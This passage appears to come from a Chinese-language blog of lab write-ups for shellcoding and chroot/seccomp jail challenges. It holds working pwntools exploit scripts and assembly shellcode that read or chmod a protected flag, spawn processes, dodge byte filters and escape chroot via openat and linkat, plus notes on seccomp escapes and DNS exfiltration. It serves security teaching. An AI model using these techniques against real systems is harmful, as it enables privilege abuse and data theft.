class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">In [3]: asm(&#x27;nop&#x27;) <br>Out[3]: b&#x27;\x90&#x27;<br></code></pre></div></td></tr></table></figure><p>使用右对齐, <code>fillchar=&#39;\x90’</code>. 即<code>payload = asm(shellcode).rjust(0x800, ‘\90’);</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode).rjust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-造一个跳板"><a href="#4-造一个跳板" class="headerlink" title="4.造一个跳板"></a>4.造一个跳板</h2><blockquote><p>使用encode函数: No encoders for amd64 which can avoid b’H’</p><p>mov的一种编码第一个字节就是H, 所以没有办法.</p><p>只能使用先read再jmp的方法.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 通过测试程序的打印功能查到read编码0xf字节, 所以不用jmp直接接在后面</span><br>shellcode = shellcraft.amd64.read(<span class="hljs-number">0</span>, addr+<span class="hljs-number">0xf</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.sendline(payload)<br>p.recv() <span class="hljs-comment"># 无关紧要</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>payload = asm(shellcode)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-禁用syscall系列"><a href="#5-禁用syscall系列" class="headerlink" title="5.禁用syscall系列"></a>5.禁用syscall系列</h2><blockquote><p>啊这, 我这……. 折腾了半天重新看了看课件终于知道他要考我什么了.</p></blockquote><p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身. 依据在于将0f05两个字节分开来.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># 例行解决arch问题</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># 发现syscall的0x0f05的时候换成一条dec指令+0x0f06, 注意到opcode已经换成了0x0f06</span><br>        <span class="hljs-comment"># 即CLTS(Clear Task-Switched Flag in CR0)指令.</span><br>        <span class="hljs-comment"># 如果整个0f04不存在的指令也行, 不会引起反汇编出现SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>6.同上, 限制前0x1000写入权限, 总共可写入0x2000</p><blockquote><p>只要read的buf在后4096字节, 然后<code>payload = payload.rjust(0x1500, b&#39;\x90&#39;)</code>即可.</p><p>居然栽在rjust这个函数上: 第一次以为rjust直接修改bytes, 但发现是个不可修改的class, 然后发现width是指修改完后的长度而不是直接在左边填充多少fillchar…</p></blockquote><h2 id="7-关闭stdio"><a href="#7-关闭stdio" class="headerlink" title="7.关闭stdio"></a>7.关闭stdio</h2><blockquote><p>照着课件的说法是每次返回1bit都能communicate…….</p><p>不过直接打开另外一个文件就行了. 居然栽在open syscall的o_flag上, 应该给个O_WRONLY或者O_RDWR.</p><p>shellcraft的open函数能接受int的o_flag或者字符串类型的flag. 只支持大写(这不是当然么, 汇编器只支持这种宏定义).</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/res&quot;</span>, <span class="hljs-number">1</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br></code></pre></div></td></tr></table></figure><h2 id="8-限制写权限"><a href="#8-限制写权限" class="headerlink" title="8.限制写权限"></a>8.限制写权限</h2><blockquote><p>而且第一次只有0x12(18)字节的汇编字节可以输入. 后面的字节使用了 <code>mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC)</code>来限制再次write.</p></blockquote><p>emmmmmm……….</p><p>tips:</p><blockquote><p>In fact these are a lot of bytes. Try different <strong>sys calls</strong>. There are other ways to read a flag as well</p><p>Search for a syscall that takes minimal argument so as to decrease size</p></blockquote><p><a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls man7</a> </p><p>找了半天, 只有个chmod能用, 居然刚好18字节, 真绝啊. 一开始想着读取文件肯定是做不到的, 因为只能写到buffer上, 塞不下更多的逻辑了.  18个字节真的太少, 只能换一个方向而去改变他的权限, 然后就可以任意读取了.</p><p>为了尽量节省空间, <code>&#39;/flag&#39;</code>放在了bytes的最后, 由起始地址addr计算出<code>/</code>的位置, 取代s1中9所在位置.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure></blockquote><p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了, 这里用chmod.</p><ul><li><p>?????好吧应该push到栈上, 然后再mov rsp, 这样子才能大幅度地减少字节长度.</p><p>而且由于是小端法存储, 自然地就有7个空字符在0x66后面.<br>gdb一看rax是put函数的返回值, 直接就是0. 这点挺重要: <strong>利用可预测的寄存器的值</strong> </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp;48 89 e7<br>mov sil, 0x04;40 b6 04<br>mov al, 0x5a;b0 5a <br>syscall    ;0f 05 长度为0xb  <br></code></pre></div></td></tr></table></figure><p>第二种方案是execv, 去执行shell, 不过文件开头要这么写<code>#!/bin/sh -p</code>, -p是防止默认的重置SUID操作. shell里面直接写<code>cat /flag</code>就成了</p><h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote><p>每8个字节作为一个64位无符号数, 使用冒泡排序升序排列. emmmmmm……</p></blockquote><p>非常刚好的每8字节从小到大排序, 主要的思想就是代码尽量少, 打开文件和读写放到另外一个文件中(c写的读文件), execve会继承父进程权限.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#   0:   68 2e 2f 61 00          push   0x612f2e</span><br><span class="hljs-comment">#   5:   48 89 e7                mov    rdi, rsp</span><br><span class="hljs-comment">#   8:   31 d2                   xor    edx, edx</span><br><span class="hljs-comment">#   a:   31 f6                   xor    esi, esi</span><br><span class="hljs-comment">#   c:   6a 3b                   push   0x3b</span><br><span class="hljs-comment">#   e:   58                      pop    rax</span><br><span class="hljs-comment">#   f:   0f 05                   syscall</span><br></code></pre></div></td></tr></table></figure><p>11.同上, 关闭stdin</p><blockquote><p>上一题仍然继续用.</p></blockquote><h2 id="12-每个byte得unique"><a href="#12-每个byte得unique" class="headerlink" title="12.每个byte得unique"></a>12.每个byte得unique</h2><blockquote><p><code>ascii_values = [ord(character) for character in text]</code>python字符串=&gt;ASCII</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    lea edx, [esi] /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>出乎意料的简单, 只要把第二个xor改成lea指令去清空edx就可以了. 一开始改的mov还不行.</p><h2 id="14-只读6个字节"><a href="#14-只读6个字节" class="headerlink" title="14.只读6个字节"></a>14.只读6个字节</h2><blockquote><p>好像只能2-stage shellcode, emmmmmmmm…….</p></blockquote><p>仍然是利用了rax等于0, rdx是shellmem地址, 也可以当做是要读取的字节数使用read函数的话只有rsi(第二个参数)需要改为rdx上的地址, 简单mov就可以了. 然后第二阶段随便整.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h1 id="module-5-jail"><a href="#module-5-jail" class="headerlink" title="module 5-jail"></a>module 5-jail</h1><ul><li><p>chroot(“/tmp/jail”)</p><ul><li><p>chroot(“/tmp/jail”) does NOT:</p><p>Close resources that reside outside of the jail.<br>cd (chdir()) into the jail.<br>Do anything else!</p></li><li><p>you can use open<strong>at</strong> and execve<strong>at</strong>: <code>int openat(**int dirfd**, char *pathname, int flags);</code></p><p>这两个函数的path如果是绝对路径, 那么dirfd就会被忽略;<br>如果path是相对路径, 而且dirfd是合法的, 那么path所引用的就是dirfd所表示的路径.</p></li><li><p>如果再次chroot会发生什么? kernel对此是完全不知情的.</p></li><li><p>Generally, a user with an effective ID of 0 (i.e., a process run as root or SUIDed to root) can <em><strong>always</strong></em> break out of a chroot, unless the chroot syscall is blocked!</p></li><li><p>Also missing other forms of isolation: <strong>PID, network, IPC</strong> </p></li><li><p>Replacements: <strong>cgroups, namespaces, seccomp</strong> </p></li></ul></li><li><p>seccomp: </p><ul><li><code>gcc -o test test.c -lseccomp</code> <code>seccomp-tools dump ./test</code> </li><li>原理是eBPF, seccomp就是使用的eBPF来实现的, 还可以用来实现一系列system trace <a href="https://github.com/iovisor/bcc">tools</a> </li></ul></li><li><p>break out seccomp: Generally, to do anything useful, a sandboxed process needs to be able to communicate with the privileged process. 有两点可能, 第一是syscall很多, 有些可能可以被利用, 第二是开发者可能为了不破坏功能而在权限方面犯错误.</p><ul><li><strong>permissive policies</strong>: ptrace() sendmsg() prctl() process_vm_writev()</li><li><strong>syscall confusion:</strong> on some systems, you can switch between 32-bit mode with 64-bit mode <em>in the same process</em>, and the syscall numbers are different between architectures. 比如说系统调用分别是<code>int 0x80 and syscall</code>(<code>\xcd\x80 and \x0f\x05</code>), 系统调用号也不同.</li><li><strong>kernel vulnerabilities</strong> in the syscall handlers: Over 30 chrome sandbox escapes in 2019 <a href="https://github.com/allpaca/chrome-sbx-db">link</a> </li><li>data exfiltration: such as sleep(), exit(), normal or crash. Or use DNS queries to bypass network egress filters.</li></ul></li></ul><blockquote><p>Redirections很重要. <a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p></blockquote><p>补充:</p><ul><li>实际测试中在shell里面直接使用chroot命令并不会发生escape, 只能在c代码中使用chroot库函数. 猜测可能是因为chroot的命令行对系统调用进行了一层封装, 加上了跳转到jail里面的目录中; 而libc库中只是单纯的系统调用, 并没有chdir这个步骤.</li><li>好几个函数都有<code>at</code>的版本, chmod-&gt;fchmodat, open-&gt;openat(open只是libc中对openat的封装) and so forth.</li><li></li></ul><h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" title="1.exemplify"></a>1.exemplify</h3><p>相当简单, 直接利用程序中chroot后没有切换到jail里面的特点, 更改cwd为真正的根目录, 第一个参数填写为flag, 最后open的时候由于flag是相对地址, 会以真正的根目录作为基准来定位true flag.</p><h3 id="2-同第一题"><a href="#2-同第一题" class="headerlink" title="2.同第一题"></a>2.同第一题</h3><blockquote><p>第一个参数不能含有flag字符串, 是为了禁止直接打开flag文件. 在这个challenge中还可以注入shellcode, </p></blockquote><p>也没什么难的, 只要在shellcode里面打开‘flag’然后写到stdin里面就可以了.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#不能直接打开flag文件</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span><span class="hljs-comment">#写到buf上, 估计很快就不行了.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span><span class="hljs-comment"># 随手加个非法指令,遇到SIGILL就知道shellcode肯定是执行完了.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><p>参数不能含有flag子串, 打开文件时有O_NOFOLLOW标志, 软连接无效,  而且在chdir之前只有一个open.<br>也不能在命令行里打开flag, 包括符号链接. 要跳出chroot也许只剩下再次chroot. 好像也不行, 看了看视频应该要用openat.<br>在kali上试试chroot. openat成功了.</p><ul><li>directory stream file descriptor和file descriptor不是同一个东西, 具体资料待查. openat只能用dirfd.</li><li>命令行里打出<code>./chroot flag 6&lt;.</code>即可, 会打开当前文件夹且dirfd=6.</li><li><strong>也可以直接打开fd=3, 这个是命令行第一个参数, 而且在chroot前被打开, 可以被openat使用.</strong> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>shellcode = shellcraft.amd64.openat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>) <br>shellcode += shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h3 id="4-seccomped-gt-openat"><a href="#4-seccomped-gt-openat" class="headerlink" title="4.seccomped -&gt; openat"></a>4.seccomped -&gt; openat</h3><blockquote><p>每一题的要求都在逐渐增加. 这一题仍然可以用openat, 没有变化.</p></blockquote><h3 id="5-linkat"><a href="#5-linkat" class="headerlink" title="5. linkat"></a>5. linkat</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.linkat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;AT_FDCWD&quot;</span>, <span class="hljs-string">&#x27;/f&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode+= shellcraft.amd64.<span 